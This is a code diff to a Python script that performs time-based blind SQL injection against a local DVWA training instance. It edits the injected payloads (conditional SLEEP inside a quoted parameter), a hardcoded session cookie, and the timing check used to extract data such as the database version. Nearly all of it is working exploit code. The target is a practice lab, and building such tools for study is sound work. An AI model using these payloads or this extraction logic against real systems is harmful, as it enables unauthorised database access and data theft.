@@ -7,6 +7,7 @@ class MyInjector(Injector):
         super().__init__()
         self.url = "http://localhost:4080/DVWA/vulnerabilities/sqli/"
         self.http_method = HttpMethod.GET
+        self.sleep = 0.012
 
     def generate_params(
         self,
@@ -14,9 +15,9 @@ class MyInjector(Injector):
         reverse,
     ):
         payload = (
-            f"1' AND(SELECT IF({condition},1,SLEEP(0.1)))%3d'a"
+            f"1' AND(SELECT IF({condition},1,SLEEP({self.sleep})))='a"
             if reverse
-            else f"1' AND(SELECT IF({condition},SLEEP(0.1),1))='a"
+            else f"1' AND(SELECT IF({condition},SLEEP({self.sleep}),1))='a"
         )
 
         return {
@@ -30,12 +31,18 @@ class MyInjector(Injector):
         _reverse,
     ):
         return {
-            "PHPSESSID": "n2mh7c5o52ihalhpk9li4jqhrk",
+            "PHPSESSID": "gs7u9ku5uqmq48djrc3h9mat5r",
             "security": "low",
         }
 
-    def evaluate_response(self, _res, t0, t1) -> bool:
-        return t1 - t0 > 0.1
+    def evaluate_response(
+        self,
+        _res,
+        t0,
+        t1,
+        reverse,
+    ) -> bool:
+        return (t1 - t0 > self.sleep) != reverse
 
 
 def main():
@@ -44,6 +51,7 @@ def main():
     my_injector = MyInjector()
 
     ### Boolean test of the sql query ###
+    loguru.logger.info("Run a batch of tests to evaluate the quality of the attack")
     my_injector.test()
 
     ### Search for the version of the database ###
